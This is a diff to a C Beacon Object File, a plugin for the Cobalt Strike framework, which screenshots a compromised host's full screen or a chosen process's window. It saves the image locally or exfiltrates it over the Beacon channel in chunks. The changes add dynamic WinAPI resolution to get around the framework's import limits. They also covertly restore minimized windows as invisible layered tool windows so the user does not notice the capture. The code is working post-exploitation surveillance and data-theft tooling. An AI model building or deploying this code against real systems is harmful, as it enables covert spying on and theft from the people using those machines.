@@ -8,13 +8,147 @@
 #pragma comment(lib, "Gdi32.lib")
 
 /*-------------------------------------------------------------
-  downloadFile:
-  Packages the given file data (returnData, of size fileSize)
-  along with the provided fileName and sends it via BeaconOutput.
-  No globals are used.
+   Typedefs for the winapis im dynamically resolving
+-------------------------------------------------------------*/
+typedef HDC(WINAPI* PFN_CreateDCA)(LPCSTR, LPCSTR, LPCSTR, const DEVMODEA*);
+typedef int     (WINAPI* PFN_GetDeviceCaps)(HDC, int);
+typedef BOOL(WINAPI* PFN_DeleteDC)(HDC);
+typedef int     (WINAPI* PFN_GetObjectA)(HANDLE, int, LPVOID);
+typedef HGDIOBJ(WINAPI* PFN_GetStockObject)(int);
+typedef HDC(WINAPI* PFN_GetDC)(HWND);
+typedef int     (WINAPI* PFN_ReleaseDC)(HWND, HDC);
+typedef HDC(WINAPI* PFN_CreateCompatibleDC)(HDC);
+typedef HBITMAP(WINAPI* PFN_CreateCompatibleBitmap)(HDC, int, int);
+typedef HGDIOBJ(WINAPI* PFN_SelectObject)(HDC, HGDIOBJ);
+typedef BOOL(WINAPI* PFN_PrintWindow)(HWND, HDC, UINT);
+typedef BOOL(WINAPI* PFN_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
+typedef BOOL(WINAPI* PFN_ShowWindow)(HWND, int);
+typedef LONG(WINAPI* PFN_SetWindowLongA)(HWND, int, LONG);
+typedef BOOL(WINAPI* PFN_SetLayeredWindowAttributes)(HWND, COLORREF, BYTE, DWORD);
+typedef BOOL(WINAPI* PFN_UpdateWindow)(HWND);
+typedef VOID(WINAPI* PFN_Sleep)(DWORD);
+typedef BOOL(WINAPI* PFN_GetWindowRect)(HWND, LPRECT);
+typedef HANDLE(WINAPI* PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL(WINAPI* PFN_WriteFile) (HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);
+typedef HGLOBAL(WINAPI* PFN_GlobalAlloc)(UINT, SIZE_T);
+typedef LPVOID(WINAPI* PFN_GlobalLock)(HGLOBAL);
+typedef BOOL(WINAPI* PFN_GlobalUnlock)(HGLOBAL);
+typedef HGLOBAL(WINAPI* PFN_GlobalFree)(HGLOBAL);
+typedef BOOL(WINAPI* PFN_GetWindowPlacement)(HWND, WINDOWPLACEMENT*);
+typedef DWORD(WINAPI* PFN_GetWindowThreadProcessId)(HWND, LPDWORD);
+typedef BOOL(WINAPI* PFN_EnumWindows)(WNDENUMPROC, LPARAM);
+typedef int     (WINAPI* PFN_GetSystemMetrics)(int);
+typedef BOOL(WINAPI* PFN_SetWindowPos)(HWND, HWND, int, int, int, int, UINT);
+typedef BOOL(WINAPI* PFN_DeleteObject)(HGDIOBJ);
+typedef HGDIOBJ(WINAPI* PFN_SelectPalette)(HDC, HPALETTE, BOOL);
+typedef UINT(WINAPI* PFN_RealizePalette)(HDC);
+typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
+typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);
+
+/*-------------------------------------------------------------
+   Declare static pointers for each API
+-------------------------------------------------------------*/
+static PFN_CreateDCA              pCreateDC = NULL;
+static PFN_GetDeviceCaps          pGetDeviceCaps = NULL;
+static PFN_DeleteDC               pDeleteDC = NULL;
+static PFN_GetObjectA             pGetObjectA = NULL;
+static PFN_GetStockObject         pGetStockObject = NULL;
+static PFN_GetDC                  pGetDC = NULL;
+static PFN_ReleaseDC              pReleaseDC = NULL;
+static PFN_CreateCompatibleDC     pCreateCompatibleDC = NULL;
+static PFN_CreateCompatibleBitmap pCreateCompatibleBitmap = NULL;
+static PFN_SelectObject           pSelectObject = NULL;
+static PFN_PrintWindow            pPrintWindow = NULL;
+static PFN_BitBlt                 pBitBlt = NULL;
+static PFN_ShowWindow             pShowWindow = NULL;
+static PFN_SetWindowLongA         pSetWindowLongA = NULL;
+static PFN_SetLayeredWindowAttributes pSetLayeredWindowAttributes = NULL;
+static PFN_UpdateWindow           pUpdateWindow = NULL;
+static PFN_Sleep                  pSleep = NULL;
+static PFN_GetWindowRect          pGetWindowRect = NULL;
+static PFN_CreateFileA            pCreateFileA = NULL;
+static PFN_WriteFile              pWriteFile = NULL;
+static PFN_CloseHandle            pCloseHandle = NULL;
+static PFN_GlobalAlloc            pGlobalAlloc = NULL;
+static PFN_GlobalLock             pGlobalLock = NULL;
+static PFN_GlobalUnlock           pGlobalUnlock = NULL;
+static PFN_GlobalFree             pGlobalFree = NULL;
+static PFN_GetWindowPlacement     pGetWindowPlacement = NULL;
+static PFN_GetWindowThreadProcessId pGetWindowThreadProcessId = NULL;
+static PFN_EnumWindows            pEnumWindows = NULL;
+static PFN_GetSystemMetrics       pGetSystemMetrics = NULL;
+static PFN_SetWindowPos           pSetWindowPos = NULL;
+static PFN_DeleteObject           pDeleteObject = NULL;
+static PFN_SelectPalette          pSelectPalette = NULL;
+static PFN_RealizePalette         pRealizePalette = NULL;
+static PFN_GetDIBits              pGetDIBits = NULL;
+static PFN_IsWindowVisible        pIsWindowVisible = NULL;
+
+/*-------------------------------------------------------------
+   Dynamically resolve the required WinAPI functions to func ptrs
+
+   for some reason cobalt has a limit to how many winapis you can use via DFR lol.
+   https://github.com/fortra/No-Consolation/issues/5
+   the limit is 32 on 4.9 and 128 on 4.10. To make this 4.9 friendly i had to do this :sob:
+-------------------------------------------------------------*/
+void ResolveAPIs(void)
+{
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    HMODULE hUser32 = GetModuleHandleA("user32.dll");
+    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
+
+    pCreateDC = (PFN_CreateDCA)GetProcAddress(hGdi32, "CreateDCA");
+    pGetDeviceCaps = (PFN_GetDeviceCaps)GetProcAddress(hGdi32, "GetDeviceCaps");
+    pDeleteDC = (PFN_DeleteDC)GetProcAddress(hGdi32, "DeleteDC");
+    pGetObjectA = (PFN_GetObjectA)GetProcAddress(hGdi32, "GetObjectA");
+    pGetStockObject = (PFN_GetStockObject)GetProcAddress(hGdi32, "GetStockObject");
+    pGetDC = (PFN_GetDC)GetProcAddress(hUser32, "GetDC");
+    pReleaseDC = (PFN_ReleaseDC)GetProcAddress(hUser32, "ReleaseDC");
+    pCreateCompatibleDC = (PFN_CreateCompatibleDC)GetProcAddress(hGdi32, "CreateCompatibleDC");
+    pCreateCompatibleBitmap = (PFN_CreateCompatibleBitmap)GetProcAddress(hGdi32, "CreateCompatibleBitmap");
+    pSelectObject = (PFN_SelectObject)GetProcAddress(hGdi32, "SelectObject");
+    pPrintWindow = (PFN_PrintWindow)GetProcAddress(hUser32, "PrintWindow");
+    pBitBlt = (PFN_BitBlt)GetProcAddress(hGdi32, "BitBlt");
+    pShowWindow = (PFN_ShowWindow)GetProcAddress(hUser32, "ShowWindow");
+    pSetWindowLongA = (PFN_SetWindowLongA)GetProcAddress(hUser32, "SetWindowLongA");
+    pSetLayeredWindowAttributes = (PFN_SetLayeredWindowAttributes)GetProcAddress(hUser32, "SetLayeredWindowAttributes");
+    pUpdateWindow = (PFN_UpdateWindow)GetProcAddress(hUser32, "UpdateWindow");
+    pSleep = (PFN_Sleep)GetProcAddress(hKernel32, "Sleep");
+    pGetWindowRect = (PFN_GetWindowRect)GetProcAddress(hUser32, "GetWindowRect");
+    pCreateFileA = (PFN_CreateFileA)GetProcAddress(hKernel32, "CreateFileA");
+    pWriteFile = (PFN_WriteFile)GetProcAddress(hKernel32, "WriteFile");
+    pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
+    pGlobalAlloc = (PFN_GlobalAlloc)GetProcAddress(hKernel32, "GlobalAlloc");
+    pGlobalLock = (PFN_GlobalLock)GetProcAddress(hKernel32, "GlobalLock");
+    pGlobalUnlock = (PFN_GlobalUnlock)GetProcAddress(hKernel32, "GlobalUnlock");
+    pGlobalFree = (PFN_GlobalFree)GetProcAddress(hKernel32, "GlobalFree");
+    pGetWindowPlacement = (PFN_GetWindowPlacement)GetProcAddress(hUser32, "GetWindowPlacement");
+    pGetWindowThreadProcessId = (PFN_GetWindowThreadProcessId)GetProcAddress(hUser32, "GetWindowThreadProcessId");
+    pEnumWindows = (PFN_EnumWindows)GetProcAddress(hUser32, "EnumWindows");
+    pGetSystemMetrics = (PFN_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
+    pSetWindowPos = (PFN_SetWindowPos)GetProcAddress(hUser32, "SetWindowPos");
+    pDeleteObject = (PFN_DeleteObject)GetProcAddress(hGdi32, "DeleteObject");
+    pSelectPalette = (PFN_SelectPalette)GetProcAddress(hGdi32, "SelectPalette");
+    pRealizePalette = (PFN_RealizePalette)GetProcAddress(hGdi32, "RealizePalette");
+    pGetDIBits = (PFN_GetDIBits)GetProcAddress(hGdi32, "GetDIBits");
+    pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");
+
+
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Resolved hKernel32 to 0x%p", hKernel32);
+    
+
+}
+
+/*-------------------------------------------------------------
+  i stole this from https://github.com/anthemtotheego/CredBandit
+  thanks @anthemtotheego :D
+
+  it downloads a file over beacon
 -------------------------------------------------------------*/
 void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
 {
+    // No WinAPI calls here; your MSVCRT and Beacon functions remain as-is
     time_t t;
     MSVCRT$srand((unsigned)MSVCRT$time(&t));
     int fileId = MSVCRT$rand();
@@ -56,6 +190,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
                     packedChunk[chunkIndex++] = returnData[i];
                 }
                 BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+                free(packedChunk);
             }
             else {
                 int lastChunkLength = fileSize - index + 4;
@@ -69,6 +204,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
                     lastChunk[lastChunkIndex++] = returnData[i];
                 }
                 BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
+                free(lastChunk);
             }
             index += chunkSize;
         }
@@ -85,6 +221,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
             packedChunk[chunkIndex++] = returnData[i];
         }
         BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
+        free(packedChunk);
     }
 
     char packedClose[4];
@@ -93,15 +230,18 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
     packedClose[2] = (fileId >> 8) & 0xFF;
     packedClose[3] = fileId & 0xFF;
     BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
+
+    free(packedData);
 }
 
 /*-------------------------------------------------------------
-  SaveHBITMAPToFile:
   Saves (or downloads) the given HBITMAP as a BMP file with
-  the provided file name. All variables are local.
+  the provided file name.
 -------------------------------------------------------------*/
 BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
 {
+    ResolveAPIs();
+
     HDC hDC;
     int iBits;
     WORD wBitCount;
@@ -110,12 +250,13 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
     BITMAPFILEHEADER bmfHdr;
     BITMAPINFOHEADER bi;
     LPBITMAPINFOHEADER lpbi;
-    HANDLE fh, hDib, hPal;
+    HANDLE fh;
+    HANDLE hDib, hPal;
     HGDIOBJ hOldPal2 = NULL;
 
-    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
-    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
-    DeleteDC(hDC);
+    hDC = pCreateDC("DISPLAY", NULL, NULL, NULL);
+    iBits = pGetDeviceCaps(hDC, BITSPIXEL) * pGetDeviceCaps(hDC, PLANES);
+    pDeleteDC(hDC);
     if (iBits <= 1)
         wBitCount = 1;
     else if (iBits <= 4)
@@ -125,10 +266,10 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
     else
         wBitCount = 24;
 
-    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
+    pGetObjectA(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = Bitmap0.bmWidth;
-    /* Negative height makes the bitmap top�down */
+    /* Negative height makes the bitmap top–down */
     bi.biHeight = -Bitmap0.bmHeight;
     bi.biPlanes = 1;
     bi.biBitCount = wBitCount;
@@ -139,27 +280,26 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
     bi.biClrImportant = 0;
     bi.biClrUsed = 256;
 
-    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8 * Bitmap0.bmHeight;
-    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
-    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
+    dwBmBitsSize = (((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8) * Bitmap0.bmHeight;
+    hDib = pGlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
+    lpbi = (LPBITMAPINFOHEADER)pGlobalLock(hDib);
     *lpbi = bi;
 
-    hPal = GetStockObject(DEFAULT_PALETTE);
+    hPal = pGetStockObject(DEFAULT_PALETTE);
     if (hPal) {
-        hDC = GetDC(NULL);
-        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
-        RealizePalette(hDC);
+        HDC hDC2 = pGetDC(NULL);
+        hOldPal2 = pSelectPalette(hDC2, (HPALETTE)hPal, FALSE);
+        pRealizePalette(hDC2);
+        // Do not forget to release DC later.
+        pReleaseDC(NULL, hDC2);
     }
 
-    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight,
+    // GetDIBits: use our dynamically resolved function
+    hDC = pGetDC(NULL);
+    pGetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight,
         (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize,
         (BITMAPINFO*)lpbi, DIB_RGB_COLORS);
-
-    if (hOldPal2) {
-        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
-        RealizePalette(hDC);
-        ReleaseDC(NULL, hDC);
-    }
+    pReleaseDC(NULL, hDC);
 
     bmfHdr.bfType = 0x4D42;  /* 'BM' */
     dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
@@ -173,12 +313,12 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
 
     if (savemethod == 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving bitmap to disk with filename %s", lpszFileName);
-        fh = CreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+        fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
         if (fh == INVALID_HANDLE_VALUE)
             return FALSE;
-        WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, &dwWritten, NULL);
-        CloseHandle(fh);
+        pWriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, &dwWritten, NULL);
+        pCloseHandle(fh);
     }
     else {
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading bitmap over beacon with filename %s", lpszFileName);
@@ -186,28 +326,25 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
             (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
     }
 
-    GlobalUnlock(hDib);
-    GlobalFree(hDib);
+    pGlobalUnlock(hDib);
+    pGlobalFree(hDib);
     free(bmpdata);
     return TRUE;
 }
 
 /*-------------------------------------------------------------
-  EnumWindowsProc:
-  Callback for EnumWindows. Instead of a struct, we use a local
-  two�element LONG_PTR array to pass the PID and capture the
-  matching window handle.
+  Callback for EnumWindows. It gets a window handle from a PID
 -------------------------------------------------------------*/
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
-    /* lParam points to a two�element array:
+    /* lParam points to a two–element array:
        index 0: the target PID (stored as LONG_PTR)
        index 1: the found window handle (initially 0)
     */
     LONG_PTR* params = (LONG_PTR*)lParam;
     DWORD targetPid = (DWORD)params[0];
     DWORD windowPid = 0;
-    GetWindowThreadProcessId(hwnd, &windowPid);
+    pGetWindowThreadProcessId(hwnd, &windowPid);
     if (windowPid == targetPid && IsWindowVisible(hwnd)) {
         params[1] = (LONG_PTR)hwnd;
         return FALSE;
@@ -216,13 +353,12 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 }
 
 /*-------------------------------------------------------------
-  FindWindowByPID:
-  Given a PID and debug flag, uses EnumWindows and a local
-  two�element array (instead of a struct) to find a matching
+  Given a PID, uses EnumWindows to find a matching
   window handle.
 -------------------------------------------------------------*/
 HWND FindWindowByPID(DWORD pid, int debug)
 {
+    ResolveAPIs();
     LONG_PTR params[2];
     params[0] = (LONG_PTR)pid;
     params[1] = 0;
@@ -239,19 +375,18 @@ HWND FindWindowByPID(DWORD pid, int debug)
 }
 
 /*-------------------------------------------------------------
-  CaptureWindow:
   Captures the given window (by hwnd) into an HBITMAP.
   If the window is minimized, it is temporarily restored.
-  Debug messages are printed only when debug is 1.
 -------------------------------------------------------------*/
 HBITMAP CaptureWindow(HWND hwnd, int debug)
 {
+    ResolveAPIs();
     if (debug)
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Starting CaptureWindow for hwnd 0x%p", hwnd);
 
     WINDOWPLACEMENT wp = { 0 };
     wp.length = sizeof(WINDOWPLACEMENT);
-    if (!GetWindowPlacement(hwnd, &wp)) {
+    if (!pGetWindowPlacement(hwnd, &wp)) {
         BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowPlacement failed");
         return NULL;
     }
@@ -261,8 +396,8 @@ HBITMAP CaptureWindow(HWND hwnd, int debug)
     RECT captureRect;
     int width, height;
     BOOL success = FALSE;
-    HDC hdcScreen = GetDC(NULL);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    HDC hdcScreen = pGetDC(NULL);
+    HDC hdcMem = pCreateCompatibleDC(hdcScreen);
     HBITMAP hBitmap = NULL;
 
     if (wp.showCmd == SW_SHOWMINIMIZED) {
@@ -270,13 +405,13 @@ HBITMAP CaptureWindow(HWND hwnd, int debug)
             BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window is minimized; restoring temporarily for capture");
 
         LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
-        SetWindowLong(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
-        SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
-        ShowWindow(hwnd, SW_RESTORE);
-        UpdateWindow(hwnd);
-        Sleep(500);  /* Allow time for rendering */
+        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
+        pSetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
+        pShowWindow(hwnd, SW_RESTORE);
+        pUpdateWindow(hwnd);
+        pSleep(500);  /* Allow time for rendering */
 
-        if (!GetWindowRect(hwnd, &captureRect)) {
+        if (!pGetWindowRect(hwnd, &captureRect)) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed (restored window)");
             goto cleanup;
         }
@@ -288,29 +423,29 @@ HBITMAP CaptureWindow(HWND hwnd, int debug)
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
             goto cleanup;
         }
-        hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
         if (!hBitmap) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
             goto cleanup;
         }
-        SelectObject(hdcMem, hBitmap);
-        success = PrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
+        pSelectObject(hdcMem, hBitmap);
+        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
         if (!success) {
             if (debug)
                 BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
-            success = BitBlt(hdcMem, 0, 0, width, height,
+            success = pBitBlt(hdcMem, 0, 0, width, height,
                 hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
             if (!success)
                 BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
         }
         /* Restore window state */
-        ShowWindow(hwnd, SW_MINIMIZE);
-        SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
-        SetWindowPos(hwnd, NULL, 0, 0, 0, 0,
+        pShowWindow(hwnd, SW_MINIMIZE);
+        pSetWindowLongA(hwnd, GWL_EXSTYLE, exStyle);
+        pSetWindowPos(hwnd, NULL, 0, 0, 0, 0,
             SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
     }
     else {
-        if (!GetWindowRect(hwnd, &captureRect)) {
+        if (!pGetWindowRect(hwnd, &captureRect)) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed");
             goto cleanup;
         }
@@ -322,26 +457,34 @@ HBITMAP CaptureWindow(HWND hwnd, int debug)
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
             goto cleanup;
         }
-        hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+        hBitmap = pCreateCompatibleBitmap(hdcScreen, width, height);
         if (!hBitmap) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
             goto cleanup;
         }
-        SelectObject(hdcMem, hBitmap);
-        success = BitBlt(hdcMem, 0, 0, width, height,
-            hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
-        if (!success)
-            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed");
+        pSelectObject(hdcMem, hBitmap);
+
+        /* Attempt to use PrintWindow to capture the full contents,
+           even if the window is in the background */
+        success = pPrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
+        if (!success) {
+            if (debug)
+                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
+            success = pBitBlt(hdcMem, 0, 0, width, height,
+                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
+            if (!success)
+                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
+        }
     }
 
 cleanup:
     if (hdcMem)
-        DeleteDC(hdcMem);
+        pDeleteDC(hdcMem);
     if (hdcScreen)
-        ReleaseDC(NULL, hdcScreen);
+        pReleaseDC(NULL, hdcScreen);
     if (!success) {
         if (hBitmap)
-            DeleteObject(hBitmap);
+            pDeleteObject(hBitmap);
         if (debug)
             BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow failed");
         return NULL;
@@ -352,26 +495,28 @@ cleanup:
 }
 
 /*-------------------------------------------------------------
-   BOF Arguments:
-    1. Filename (string)
+  go:
+  BOF args:
+    1. Filename 
     2. Save method: 0 = save to disk, 1 = download via Beacon.
     3. PID: if nonzero, capture that window; if zero, capture the full screen.
 -------------------------------------------------------------*/
 #ifdef BOF
+int debug = 0; // enable the debugging prints
 void go(char* buff, int len)
 {
+    ResolveAPIs();  // ensure API pointers are resolved
+
     datap parser;
     BeaconDataParse(&parser, buff, len);
 
     char* filename = BeaconDataExtract(&parser, NULL);
     int savemethod = BeaconDataInt(&parser);
     int pid = BeaconDataInt(&parser);
-    int debug = 0;
+
 
     if (debug)
-        BeaconPrintf(CALLBACK_OUTPUT,
-            "[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, debug: %d",
-            filename, savemethod, pid, debug);
+        BeaconPrintf(CALLBACK_OUTPUT,"[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, debug: %d",filename, savemethod, pid, debug);
 
     HBITMAP hBitmap = NULL;
     if (pid != 0) {
@@ -391,25 +536,25 @@ void go(char* buff, int len)
     else {
         if (debug)
             BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Capturing full screen");
-        int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
-        int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
-        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-        HDC hScreen = GetDC(NULL);
-        HDC hDC = CreateCompatibleDC(hScreen);
-        hBitmap = CreateCompatibleBitmap(hScreen, w, h);
+        int x1 = pGetSystemMetrics(SM_XVIRTUALSCREEN);
+        int y1 = pGetSystemMetrics(SM_YVIRTUALSCREEN);
+        int w = pGetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int h = pGetSystemMetrics(SM_CYVIRTUALSCREEN);
+        HDC hScreen = pGetDC(NULL);
+        HDC hDC = pCreateCompatibleDC(hScreen);
+        hBitmap = pCreateCompatibleBitmap(hScreen, w, h);
         if (!hBitmap) {
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
-            ReleaseDC(NULL, hScreen);
-            DeleteDC(hDC);
+            pReleaseDC(NULL, hScreen);
+            pDeleteDC(hDC);
             return;
         }
-        HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-        if (!BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY))
+        HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
+        if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY))
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture");
-        SelectObject(hDC, old_obj);
-        DeleteDC(hDC);
-        ReleaseDC(NULL, hScreen);
+        pSelectObject(hDC, old_obj);
+        pDeleteDC(hDC);
+        pReleaseDC(NULL, hScreen);
     }
 
     if (hBitmap) {
@@ -419,7 +564,7 @@ void go(char* buff, int len)
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save bitmap");
         else
             BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Screenshot saved/downloaded as %s", filename);
-        DeleteObject(hBitmap);
+        pDeleteObject(hBitmap);
     }
 }
 #else
